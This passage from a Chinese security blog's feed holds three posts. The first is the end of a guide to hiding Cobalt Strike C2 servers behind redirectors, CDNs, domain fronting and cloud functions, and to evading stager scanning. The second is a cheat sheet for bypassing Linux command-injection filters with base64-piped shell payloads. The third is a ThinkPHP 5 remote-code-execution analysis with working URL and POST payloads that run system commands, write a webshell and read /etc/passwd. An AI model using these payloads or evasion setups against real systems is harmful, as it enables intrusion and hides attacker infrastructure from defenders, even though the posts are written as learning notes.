update.domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将证书打包并生成store文件</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> /etc/letsencrypt/live/update.domain.com/fullchain.pem -inkey /etc/letsencrypt/live/update.domain.com/privkey.pem -out update.domain.com.p12 -name update.domain.com -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore update.domain.com.store -srckeystore update.domain.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="built_in">alias</span> update.domain.com</span><br></pre></td></tr></table></figure><p>接下来就需要用到<a href="https://www.cobaltstrike.com/help-malleable-c2">Malleable C2 profile</a>来引入我们自己申请的证书。以<code>amazon.profile</code>为例，将刚才生成的store文件放到CS目录下，向<code>amazon.profile</code>文件追加证书配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">https-certificate &#123;</span></span><br><span class="line"><span class="string">    set keystore &quot;update.domain.com.store&quot;;</span></span><br><span class="line"><span class="string">    set password &quot;123456&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺带把dns_idle和stager路径也改了</span></span><br><span class="line">sed -i <span class="string">&#x27;11i\set dns_idle &quot;8.8.8.8&quot;;&#x27;</span> amazon.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">http-stager &#123;</span></span><br><span class="line"><span class="string">    set uri_x86 &quot;/jquery.min.js&quot;;</span></span><br><span class="line"><span class="string">    set uri_x64 &quot;/jquery.debug.js&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置文件有效性</span></span><br><span class="line">./c2lint amazon.profile</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_y.png"></p><p>再通过<code>nohup ./teamserver IP password amazon.profile &amp;</code>启动后抓上线包，证书就是自己申请的了</p><hr><p>经过以上修改后虽然起到了一定的伪装效果，但在投递Payload、Beacon监听、会话回连等过程中，马被杀被分析、Beacon的Listener被主动扫描、流量触发WAF/IDS规则都可能让C2服务器等基础设施难逃被标记的命运，这时我们可以拉一个靠山（云）或是临时工（VPS）顶在前面，使得CS服务器从风暴前线转移到相对安全的后方阵地。</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>就像nginx反向代理会隐藏后端的tomcat等应用服务器一样，我们可以开一个按时付费、随时能销毁的机器充当临时工，它作为一个中间人转发马和CS服务器相应端口的流量。但要注意的是需要给CS服务器所在机器加上白名单防火墙，只放行临时工机器的IP。</p><ul><li>当然也有个缺点就是CS操作界面的外部IP就都会是临时工的IP了，可以设置<code>trust_x_forwarded_for</code>头或通过目标向Log平台发起请求等方法获取真实IP</li></ul><p><img src="/img/jcyyccss_d.png"></p><p>图是CS手册里的，暂时不必搞这么多分工和分级，先搭建一个简单的<code>目标机器 &lt;-&gt; 临时工 &lt;-&gt; CS服务器</code>这种拓扑的环境。</p><p>I. 设置CS服务器所在机器的白名单防火墙</p><p><img src="/img/jcyyccss_e.png"></p><p>II. 在临时工机器上安装socat并进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install socat</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 &amp;</span><br><span class="line">socat TCP4-LISTEN:443,fork TCP4:1.1.1.1:443 &amp;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用 netstat -pantu | grep socat 查看后台转发的端口，kill PID 中止转发</span></span><br></pre></td></tr></table></figure><p>III. 创建CS的Listener，设置回连地址为临时工的IP</p><p><img src="/img/jcyyccss_f.png"></p><p>IV. 向目标投递马子并执行，然后坐等上线即可</p><ul><li>此外还有一些专门做转发比如微林之类的</li></ul><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>简单的CDN转发其实就是临时工角色从自己开的VPS变成了Cloudflare、XX云等厂商而已，只需要将域名ns记录给到对应的CDN厂商，之后马儿通过域名上线即可。注意一下CS服务器所在机器的防火墙白名单，要设置为CDN厂商的段（没有预设的话就自己搜集一下）。</p><p><img src="/img/jcyyccss_g.png"></p><p>这个的好处就是，相比自己开的临时工VPS依然可能被标记/被封，CDN厂商IP服务的站会很多，威胁情报要规避误报不太可能把CDN都拉黑。。。下面简述一下在freenom注册域名并且走Cloudflare CDN上线的流程。</p><p>I. 在freenom嫖一个免费域名，不用付费也规避了资金溯源</p><p>II. 将域名的NS记录设置为CF提供的</p><p><img src="/img/jcyyccss_h.png"></p><p>III. 等DNS缓存刷新后，通过域名上线即可</p><p><img src="/img/jcyyccss_i.png"></p><ul><li>要注意在<code>DNS-&gt;配置</code>中开启<code>开发模式</code>用来取消缓存（每次3小时），否则可能会只有心跳但执行不了命令。其次CloudFlare免费套餐限定了<a href="https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy">http/https能用的端口</a></li></ul><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>在介绍域前置是什么之前，我们先思考一个问题：CDN一个IP对应多个站点，它是怎么知道到底每个请求要回源到哪个站点的。答案就是根据HTTP的Host请求头来区分，举个例子：</p><ul><li>a.com 用了CDN 1.2.3.4</li><li>b.net 也用了CDN 1.2.3.4</li></ul><p>我们通过<code>curl -v &#39;a.com&#39; -H &#39;b.net&#39;</code>最终访问的也是<code>b.net</code>，因为<code>a.com</code>的DNS会解析到<code>1.2.3.4</code>，而CDN是根据Host来判断的。</p><p>因此就可以在CDN中配置回源IP为CS所在服务器，并将加速域名设置为 <code>在该CDN提供商这里尚未被占用的</code> 高可信白名单子域名（例如systemupdate.microsoft.com）</p><p>但是，真的是这样嘛？</p><p>放在以前，甚至半年前都是可行的。很多CDN提供商都不需要校验加速域名的所有权，或是如果回源IP为自家产品就不需要校验。但是现在以前常说的<code>CloudFront、Azure、CloudFlare、阿里云</code>等厂商都需要<a href="https://help.aliyun.com/document_detail/169377.html?spm=5176.11785003.overview.3.704c142fjv5nwd">验证域名归属权</a>了，需要向加速域名添加CNAME、TXT等记录来证明所有权，这样基本也就断了这条路子。</p><p>还有点小想法就是利用某些有子域控制权的服务、拿下一些软柿子DNS控制权、或者退而求其次注册些形如<code>mlcrosoft</code>的域名骗骗视力不好的管理员。</p><ul><li>也许还有不需要验证或是能Bypass的，只是笔者还没发现或是get到姿势</li></ul><h3 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h3><p>云函数简单的说就是云服务厂商已经搭建好了多种语言执行环境，我们只需要把代码通过Web传上去（或是在线编辑）就能执行。部署在云上自带CDN特效，只需要跑个转发代码就能被当作转发器用，即<code>目标机器 &lt;-&gt; 云函数CDN &lt;-&gt; CS服务器</code>。</p><p><img src="/img/jcyyccss_j.png"></p><p>各个厂商的云函数部署大同小异，具体方法可参考各家的文档。笔者特意测试了CS4.0是能正常上线并执行命令的，并不是一定得用CS4.1。除此之外中间其实踩了不少坑，挑几个可能比较普适的聊一下QAQ。</p><p><img src="/img/jcyyccss_k.png"></p><p>I. 首先编写转发代码时，URL后不要再加斜杠<code>/</code>了，不然到了CS那可能会成双斜杠<code>//</code>，转发的协议也要跟CS的Listener类型要对得上。比如位于<code>1.1.1.1</code>机器上的CS有一个https的Listener，那转发代码的URL就要写成<code>https://1.1.1.1</code></p><p>II. 为了用自己搞的HTTPS证书就会要套profile，如果在<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>的基础上改，一定要修改或是注释掉里面<code>header &quot;Host&quot;</code>部分。至于原因，想想之前介绍的CDN如何区分不同站点就明白了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/header &quot;Host&quot;/#header &quot;Host&quot;/g&#x27;</span> amazon.profile</span><br></pre></td></tr></table></figure><p>III. 云函数会有 前端/后端 请求超时时间，建议把这个秒数稍微调大点，不然stage的马可能来不及走完流程就被挂了。</p><p>IV. 需要启用集成响应，否则上线下发不了命令。</p><h2 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h2><p>CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;x9cI&#x2F;</span><br><span class="line">&#x2F;fYKR&#x2F;</span><br><span class="line">&#x2F;Mrm0&#x2F;</span><br><span class="line">&#x2F;wQPD&#x2F;</span><br><span class="line">&#x2F;yDHX&#x2F;</span><br><span class="line">&#x2F;BCre&#x2F;</span><br><span class="line">&#x2F;WHVh&#x2F;</span><br></pre></td></tr></table></figure><p>在profile中配置<code>http-stager</code>可以改变stage马的默认请求路径：</p><p><img src="/img/jcyyccss_l.png"></p><p>但这并不会让之前的默认规则失效，此时通过checksum8规则路径依然是可以正常上线执行命令的。</p><p><img src="/img/jcyyccss_m.png"></p><p>我们在浏览器中手动访问该路径会下载一个文件，随后可以利用固定的抑或密钥将其解密看个光光。</p><p><img src="/img/jcyyccss_n.png"></p><p>解决这个问题最方便的办法就是用完就把stager给kill掉，用的时候再编辑下Listener并保存就会重新开起来。</p><p><img src="/img/jcyyccss_o.png"></p><p>比较一劳永逸的办法就是反编译出class修改抑或字节并重新加密替换回去。已经有师傅改好了现成的，不过<code>0x3e</code>这个抑或字节迟早也会被加入解密全家桶，所以还是得团队自己改好一个自用的并将知道密钥的人咩口（误。之后再用<code>grab_beacon_config.nse</code>脚本去扫描，因为抑或密钥变了自然也就解析不出了。</p><p><img src="/img/jcyyccss_p.png"></p><h2 id="JA3-S-amp-JARM"><a href="#JA3-S-amp-JARM" class="headerlink" title="JA3/S &amp; JARM"></a>JA3/S &amp; JARM</h2><p>这是一类根据Java版本、Web服务器、TLS版本等多因素TLS握手包生成指纹的方法，具体介绍及工具可参考<a href="https://github.com/salesforce/jarm">jarm</a>。</p><p>目前主要用于识别的CS的JARM指纹是<code>07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1</code>，利用这个指纹去识别其实也会包含不少像Tomcat、Weblogic这类的JavaWeb服务器。且该指纹是基于JDK11，如果用JDK13去跑CS则会得到不一样的指纹。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据对CS服务器的识别方式，主要可以分为主动扫描和被动识别，同时对每种标记方法介绍了相应的隐藏方法。像端口转发、CDN这类方法其实也可以组合使用，不过从实测的速度来看效果会很不理想。除此以外还有一些小套路比如让上线用的域名泛解析到同行（逃，像CloudFlare这种免费套餐不允许设置泛解析的就多加几条记录。</p><p>对于防守方来说，除了利用上述方法去识别没捂严实的CS服务器，可以考虑利用checksum8规则的特点给CS服务器疯狂假上线干扰攻击队，或者直接给各大杀软和沙箱批量交样本:(</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1349/">Cobalt Strike 绕过流量审计</a></p><p><a href="http://www.feidao.site/wordpress/?p=4457">CobaltStrike流量规避和cdn配置</a></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/108027233">使用CobaltStrike搭建域前置</a></p><p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p><p><a href="https://lmntrix.com/lab/lmntrix-labs-hiding-in-plain-sight-with-reflective-injection-and-domain-fronting/">Reflective Injection And Domain Fronting</a></p><p><a href="https://www.anquanke.com/post/id/224535">浅析CobaltStrike Beacon Staging Server扫描</a></p><p><a href="https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw">Bypass cobaltstrike beacon config scan</a></p><p><a href="https://sysopfb.github.io/malware,/cobaltstrike/2020/03/24/beacon-in-azure.html">Hiding in the clouds</a></p><p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">CobaltStrikeParser</a></p><p><a href="https://mp.weixin.qq.com/s/hz9lZidZXgbPrkI32pCdVQ">关于CobaltStrike的Stager被扫问题</a></p><p><a href="https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/">Analyzing Cobalt Strike for Fun and Profit</a></p><p><a href="https://blog.cobaltstrike.com/2020/12/08/a-red-teamer-plays-with-jarm/">A Red Teamer Plays with JARM</a></p><p><a href="https://www.anquanke.com/post/id/225627">利用JARM指纹进行TLS服务端标记</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。&lt;/p&gt;
&lt;h2 id=&quot;默认端口&quot;&gt;&lt;a href=&quot;#默认端口&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="cs" scheme="https://hosch3n.github.io/tags/cs/"/>
    
    <category term="检测" scheme="https://hosch3n.github.io/tags/%E6%A3%80%E6%B5%8B/"/>
    
    <category term="伪装" scheme="https://hosch3n.github.io/tags/%E4%BC%AA%E8%A3%85/"/>
    
    <category term="端口" scheme="https://hosch3n.github.io/tags/%E7%AB%AF%E5%8F%A3/"/>
    
    <category term="tls" scheme="https://hosch3n.github.io/tags/tls/"/>
    
    <category term="cdn" scheme="https://hosch3n.github.io/tags/cdn/"/>
    
    <category term="stage" scheme="https://hosch3n.github.io/tags/stage/"/>
    
    <category term="ja3" scheme="https://hosch3n.github.io/tags/ja3/"/>
    
    <category term="jarm" scheme="https://hosch3n.github.io/tags/jarm/"/>
    
  </entry>
  
  <entry>
    <title>Linux命令注入Bypass过滤</title>
    <link href="https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/"/>
    <id>https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/</id>
    <published>2020-11-21T02:56:10.000Z</published>
    <updated>2021-01-17T05:44:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><code>$&#123;IFS&#125;</code>在<code>man bash</code>手册中有介绍。它是一个字符串类型的分隔符集合，顾名思义就是用来定义分隔符的内置变量。通过<code>echo -n &quot;$IFS&quot; | hexdump</code>可以看到十六进制编码后的内部值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$IFS</span>&quot;</span> | hexdump</span><br><span class="line">0000000 0920 000a                              </span><br><span class="line">0000003</span><br></pre></td></tr></table></figure><p>不同的Linux发行版略有差异，主要是<code>0x09（\t）</code>、<code>0x20（空格）</code>、<code>0x0a（\n）</code>这三个默认值顺序的不同。它们三兄弟虽然紧挨在一起，但都是单独地起作用（即没有用来分割分隔符的分隔符）。IFS的值与<code>$*</code>、<code>$@</code>等内置变量也关系密切，通过将IFS赋空（NULL）可以实现一些特殊效果。在绕过时可以配合<code>$9</code>这个特殊空字符串</p><ul><li>重定向符：<code>cat&lt;&gt;flag</code>、<code>cat&lt;flag</code></li></ul><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>灵活运用<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code>、<code>;</code>、<code>%0a（\n）</code>、<code>:</code>等符号</p><h2 id="过滤斜杠"><a href="#过滤斜杠" class="headerlink" title="过滤斜杠"></a>过滤斜杠</h2><p>用<code>cd</code>配合命令分隔符</p><p>通过grep递归查找：<code>grep -ri . flag</code></p><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p>假设过滤<code>cat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">`c<span class="string">&#x27;&#x27;</span>at`</span><br><span class="line"></span><br><span class="line">`c<span class="string">&quot;&quot;</span>at`</span><br><span class="line"></span><br><span class="line">```ca``t```</span><br><span class="line"></span><br><span class="line">`ca\t`</span><br><span class="line"></span><br><span class="line">`x=ca;y=t;<span class="variable">$x</span><span class="variable">$y</span>`</span><br><span class="line"></span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&#x27;Y2F0IGZsYWc=&#x27;</span>|base64 -d|sh`</span><br><span class="line"></span><br><span class="line">`bash -c <span class="string">&quot;&#123;echo, Y2F0IGZsYWc=&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 综合利用其它变量构造</span></span><br></pre></td></tr></table></figure><h2 id="无x权限的ELF"><a href="#无x权限的ELF" class="headerlink" title="无x权限的ELF"></a>无x权限的ELF</h2><p>利用动态加载器执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldd readflag</span><br><span class="line"></span><br><span class="line">readelf -r readflag</span><br><span class="line"></span><br><span class="line">./lib64/ld-linux-x86-64.so.2 ./readflag</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;过滤空格&quot;&gt;&lt;a href=&quot;#过滤空格&quot; class=&quot;headerlink&quot; title=&quot;过滤空格&quot;&gt;&lt;/a&gt;过滤空格&lt;/h2&gt;&lt;p&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;在&lt;code&gt;man bash&lt;/code&gt;手册中有介绍。它是一个</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="linux" scheme="https://hosch3n.github.io/tags/linux/"/>
    
    <category term="bypass" scheme="https://hosch3n.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析代码执行篇</title>
    <link href="https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/</id>
    <published>2020-11-05T11:51:12.000Z</published>
    <updated>2020-12-03T05:45:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境搭建基础可以参考SQL注入篇和官方文档</p><h2 id="代码执行1"><a href="#代码执行1" class="headerlink" title="代码执行1"></a>代码执行1</h2><p>通过传参可以调用任意类方法，调用一些具有回调功能的函数时可以导致代码执行。</p><p>影响版本：</p><ul><li>5.0.7&lt;=ThinkPHP&lt;=5.0.22</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.1</span><br><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.0</span><br><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username             # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;runtime&#x2F;log&#x2F;202012&#x2F;02.log  # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php     # 包含任意.php文件</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.23</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">改进控制器获取</a>这个commit</p><p><img src="/img/tp5ldfxrce_a.png"></p><p>加了个限制大小写字母的过滤。从官方文档可以知道，获取控制器的方式取决于用的哪种路由模式，ThinkPHP默认无强制路由、支持兼容模式，SQL注入篇中都是用的<code>?s=/模块/控制器/方法</code>这种Payload，此处可以合理猜测能够调用到危险方法。</p><p>将源码更新为5.0.22，直接全局搜索<code>eval</code>、<code>assert</code>和<code>system</code>这类赤果果的关键词基本没得搞头，但是搜回调类、反射类的函数就会眼前一亮。</p><p><img src="/img/tp5ldfxrce_b.png"></p><p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p><p><img src="/img/tp5ldfxrce_d.png"></p><p>5.1版本的利用方法类似而且能利用的类比5.0更多，官方正则判断的修复方式就是卡了命名空间的逃逸。</p><ul><li><code>$_SERVER[&#39;PATH_INFO&#39;]</code>会将<code>\</code>转为<code>/</code></li></ul><h2 id="代码执行2"><a href="#代码执行2" class="headerlink" title="代码执行2"></a>代码执行2</h2><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">sss&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;route[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"># 包含任意文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[REQUEST_METHOD]&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 5.1.17 &lt;&#x3D; ThinkPHP5 &lt;&#x3D; 5.1.32 需要error_reporting(0);</span><br><span class="line">c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.24</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a>这个commit</p><p><img src="/img/tp5ldfxrce_e.png"></p><p>调用<code>Request</code>类方法前做了白名单判断，猜测漏洞可能是能调用当前类任意方法，找到<code>Config::get(&#39;var_method&#39;)</code>对应的值为<code>_method</code>。</p><p><img src="/img/tp5ldfxrce_f.png"></p><p>回顾一下SQL注入篇中说过<code>凡是使用框架提供的请求变量获取方法(Request类param方法及input助手函数)，都会经过这个filterExp方法的过滤</code>，其中的<code>filterExp</code>方法是被<code>filterValue</code>方法拉起调用的，而<code>filterValue</code>方法中就存在敏感函数<code>call_user_func</code>：</p><p><img src="/img/tp5ldfxrce_g.png"></p><p>全局搜索对应的<code>filterValue</code>方法，看到可以由824行的<code>cookie</code>方法或是由994行的<code>input</code>方法触发（但是似乎框架默认逻辑没有用到<code>cookie</code>方法）。</p><p><img src="/img/tp5ldfxrce_h.png"></p><p>跟进<code>getFilter</code>方法后看上去影响不大先不管，回来继续向上跟进<code>array_walk_recursive</code>函数传递的第一和第三个参数，进而寻找调用了<code>input</code>方法的地方（<code>-&gt;input\(|::input\(</code>）：</p><p><img src="/img/tp5ldfxrce_i.png"></p><p>这个构造函数简直来得不要太妙（是个伏笔2333）：如果当前类中的属性名有与<code>$options</code>数组中键名相同的，就会被覆盖为相应的键值，并且给<code>$this-&gt;input</code>属性赋值了完全可控的<code>php://input</code>。</p><p>有很多地方调用了<code>input</code>方法，先看下<code>Request</code>类的<code>param</code>方法：</p><p><img src="/img/tp5ldfxrce_j.png"></p><p>出现了被更新白名单的<code>method</code>方法，至此利用链的链尾已经基本清晰：</p><p>?-&gt;<code>param</code>-&gt;<code>method</code>、<code>input</code>-&gt;<code>filterValue</code>-&gt;<code>call_user_func</code></p><p>接下来需要思考如何通过<code>Request</code>类的某个方法修改默认为空的<code>$filter</code>的值呢？刚才那个构造函数刚好可以实现对<code>$this-&gt;filter</code>变量覆盖！也就是通过$_POST传入<code>_method=__construct&amp;filter[]=system</code>。搞定了一个参数，继续想办法搞定另外一个参数：</p><p><img src="/img/tp5ldfxrce_k.png"></p><p>继续通过变量覆盖控制<code>$this-&gt;get</code>或者<code>$this-&gt;route</code>的值，就能直接进到<code>input</code>方法中。也就是继续通过$_POST传入<code>&amp;get[]=whoami</code>或是<code>&amp;route[]=whoami</code>，此时如果<code>&#39;app_debug&#39; =&gt; true,</code>就可以直接看到命令执行结果：</p><p><img src="/img/tp5ldfxrce_l.png"></p><p>这也印证了此时的<code>param</code>方法确实被框架调用了，但是一旦关掉<code>app_debug</code>就会发现并不能RCE了 T^T，显然事情没这么简单，我们还是得继续老实向前分析调用栈。动态调试一下看看调用栈里是谁翻了<code>param</code>方法的牌子：</p><p><img 